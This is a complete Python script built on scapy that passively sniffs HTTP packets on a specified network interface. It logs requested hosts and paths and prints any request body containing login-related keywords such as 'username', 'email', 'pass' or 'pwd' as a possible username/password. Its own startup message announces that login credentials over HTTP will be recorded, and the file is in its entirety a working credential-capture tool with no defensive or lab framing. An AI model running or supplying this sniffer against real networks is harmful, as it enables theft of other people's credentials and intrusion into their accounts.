#!/usr/bin/env python3

import scapy.all as scapy
import argparse
from scapy.layers import http
from colored import fg, bg, attr

try:
    file1 = open('http-sniffer-header.txt', 'r')
    print(' ')
    print (file1.read())
    file1.close()
except IOError:
    print('\nBanner File not found!')
    

# get interface on which to sniff packets
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Use -i flag to specify Interface on which to sniff Packets")
    options = parser.parse_args()
    
    if not options.interface:
        parser.error("[-] Please specify Interface on which to sniff Packets. Use --help for instructions.")
        
    return options.interface


# to sniff packets on mentioned interface
def sniff(iface):
    print("\n[+] HTTP Sniffer is active. Login credentials over HTTP will be recorded.\n")
    scapy.sniff(iface=iface, store=False, prn=process_packet)


# to process captured packets over http
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("\r - HTTP Request : " + str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username".encode(), "name".encode(), "user".encode(), "email".encode(), "usr".encode(), "login".encode(), "password".encode(), "pass".encode(), "pwd".encode(), "passwd".encode()]
            for key in keys:
                if key in load:
                    load = str(load)
                    color = fg('red')
                    reset = attr('reset')
                    print("\n[+] Possible username/password : " + color + load[1:] + reset + "\n")
                    break


# call get_interface() and sniff()
iface = get_interface()
sniff(iface)
